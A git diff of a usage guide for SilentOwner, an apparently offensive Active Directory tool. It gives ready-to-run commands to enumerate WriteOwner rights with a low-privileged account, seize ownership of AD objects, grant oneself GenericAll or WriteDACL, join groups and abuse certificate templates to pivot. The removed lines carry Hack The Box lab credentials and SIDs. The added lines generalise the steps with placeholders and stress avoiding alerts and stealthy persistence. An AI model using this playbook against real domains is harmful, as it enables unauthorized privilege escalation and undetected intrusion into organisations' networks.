@@ -1,125 +1,116 @@
-# 🧠 USAGE-STRATEGY.md — Maximize Privilege with Certipy-ACL + SilentOwner
+# 🧩 USAGE STRATEGY — SilentOwner
 
-SilentOwner is most effective **after** identifying a target object where you hold **WriteOwner** permissions. To achieve this, we recommend pairing it with [`certipy-acl`](https://github.com/xploitnik/certipy-acl), a stealth LDAP enumeration tool that filters ACEs by SID — letting you silently map real control paths without scanning noise.
+This guide explains how to **maximize the power of SilentOwner** by chaining it with stealth LDAP enumeration tools like `certipy-acl`.
+
+> 🧬 Goal: Use **WriteOwner** to quietly take over AD objects — and pave the way to **persistence** or **privilege escalation** — all without triggering alerts.
 
 ---
 
-## 🔗 Strategic Flow
+## 1. 🔓 Step One — Low-Privileged LDAP Bind
 
-```text
-🎯 Start with low-priv LDAP creds → Enumerate SIDs → Find WriteOwner → Take Ownership → Inject ACEs (optional)
+Start with any domain account — no admin needed.
+
+```bash
+ldapsearch -H ldap://<DC_IP> \
+  -D 'user@domain.local' \
+  -w 'password' \
+  -b "DC=domain,DC=local" \
+  "(objectClass=user)" sAMAccountName objectSid
 ```
 
+This gives you:
+- Usernames and their SIDs
+- Group objects (optional)
+- The **Domain SID**, which all object SIDs will share
+
 ---
 
-## 🔍 Step 1 — Use Certipy-ACL to Enumerate Real Permissions
+## 2. 🔎 Step Two — Run `certipy-acl`
 
-(Certified HTB Case Study)
-
-Start with any valid domain user:
+Use your account with `certipy-acl` to discover where you have **WriteOwner**.
 
 ```bash
 python3 -m certipy_tool \
-  -u 'judith.mader@certified.htb' \
-  -p 'judith09' \
-  -target certified.htb \
-  -dc-ip 10.129.128.69 \
-  --resolve-sids \
-  --filter-sid S-1-5-21-729746778-2675978091-3820388244-1103
+  -u 'user@domain.local' \
+  -p 'password' \
+  -target domain.local \
+  -dc-ip <DC_IP> \
+  --filter-sid <YOUR_SID> \
+  --resolve-sids
 ```
 
-Look for entries like:
+✅ Look for output like:
 
 ```text
-[ACL] CN=Management,CN=Users,DC=certified,DC=htb
-  [ACE] Type: ACCESS_ALLOWED, Mask: 0x80000, SID: S-1-5-21-...-1103
+[ACL] CN=SomeGroup,...
+  [ACE] Type: ACCESS_ALLOWED, Mask: 0x80000, SID: <your SID>
     [+] WriteOwner
 ```
 
-This tells you:
-- `judith.mader@certified.htb` has **WriteOwner** over the `Management` group.
-- You can now proceed to take full ownership.
-
 ---
 
-## 🛡️ Step 2 — Run SilentOwner to Assume Ownership
+## 3. 🧬 Step Three — Run SilentOwner
 
-Once you find a target object, silently take over: 
+Now you know:
+- The object DN you can take over
+- Your own SID
+
+Use `SilentOwner.py` to **replace the OwnerSID** without modifying ACEs.
 
 ```bash
 python3 SilentOwner.py \
-  --dc-ip 10.129.128.69 \
-  -u judith.mader@certified.htb \
-  -p 'judith09' \
-  --domain certified.htb \
-  --target-dn 'CN=Management,CN=Users,DC=certified,DC=htb' \
-  --new-owner-sid 'S-1-5-21-729746778-2675978091-3820388244-1103'
+  --dc-ip <DC_IP> \
+  -u 'user@domain.local' \
+  -p 'password' \
+  --domain domain.local \
+  --target-dn 'CN=TargetGroup,CN=Users,DC=domain,DC=local' \
+  --new-owner-sid '<YOUR_SID>'
 ```
 
-Expected output: Once you find a target object, silently take over: 
-
-```text
-[+] LDAP bind successful.
-[DEBUG] Raw sd['OwnerSid']: b'...'
-[+] Current owner: S-1-5-21-...-500
-[+] Replacing owner with: S-1-5-21-...-1103
-[✅] Ownership of CN=Management,CN=Users,DC=certified,DC=htb successfully changed
-```
+SilentOwner will:
+- Pull the `nTSecurityDescriptor`
+- Replace only the `OwnerSID`
+- Write it back via `ldap.modify()`
 
 ---
 
-## 🔁 Step 3 — Optional Post-Ownership Control
+## 4. 🧱 Step Four — Post-Takeover
 
-Once you’re the owner of the object, you can:
+After becoming owner, **you can grant yourself full rights** using another tool:
 
-- Inject custom ACEs (e.g., grant yourself `GenericAll`, `WriteDACL`, or `WriteMember`)
-- Silently add yourself to groups
-- Maintain stealthy persistence
+### Option A: Inject ACE with `inject_ace.py`
+Inject `GenericAll` or `WriteDACL` to the object's DACL (planned future feature)
 
-> 🧪 A future companion script `inject_ace.py` will let you do this in a surgical, fully LDAP-based way.
-
----
-
-## 🧩 Real-World Flow: (Certified HTB Case Study)
-
-```text 
-judith.mader (SID: ...1103)
-│
-└── ✅ WriteOwner over:
-    CN=Management (SID: ...1104)
-    │
-    └── ✅ GenericWrite over:
-        CN=management_svc (SID: ...1105)
-        │
-        └── ✅ GenericAll over:
-            CN=ca_operator (SID: ...1106)
-```
-
-You control the top of the chain (Management), and from there, you can pivot silently through multiple privilege levels using SID awareness.
+### Option B: Abuse Ownership for AD CS
+If the object is a group with **Enroll** rights over a Certificate Template:
+- Add yourself to the group
+- Request cert → authenticate → pivot
 
 ---
 
-## 🧠 Why This Strategy Works
-
-- **No Shell Needed** — All actions are done over LDAP.
-- **No Graph Noise** — Unlike BloodHound, you see *only what matters*.
-- **SID Precision** — You control the logic. You control the chain.
-- **Stealth** — No scanning. No alerts. Just privilege.
-
----
-
-## 📁 Suggested Repo Structure
+## 🔁 Recap Flow
 
 ```
-SilentOwner/
-├── SilentOwner.py
-├── README.md
-├── USAGE-STRATEGY.md  ← you are here
-├── requirements.txt
-└── .gitignore
+🧠 LDAP SID extraction
+   │
+   └───▶ 🎯 certipy-acl → find WriteOwner over object
+           │
+           └───▶ 🧬 SilentOwner → set yourself as new owner
+                     │
+                     └───▶ 🧱 Inject ACEs or abuse group privileges
 ```
 
 ---
 
-## 🔐 Built to Empower SIDs — And the People Who Know How to Use Them.
+## 🔒 Stay Stealthy
+
+✅ SilentOwner modifies **only** the OwnerSID, using `SDFlags=0x01`  
+✅ No ACE injection, no shell, no PowerShell, no beacon  
+✅ Ideal for red teamers and stealthy persistence setup
+
+---
+
+📚 Created by [xploitnik](https://github.com/xploitnik)  
+Contributions welcome — feel free to submit new strategy flows, tools, or scripts!
+
 
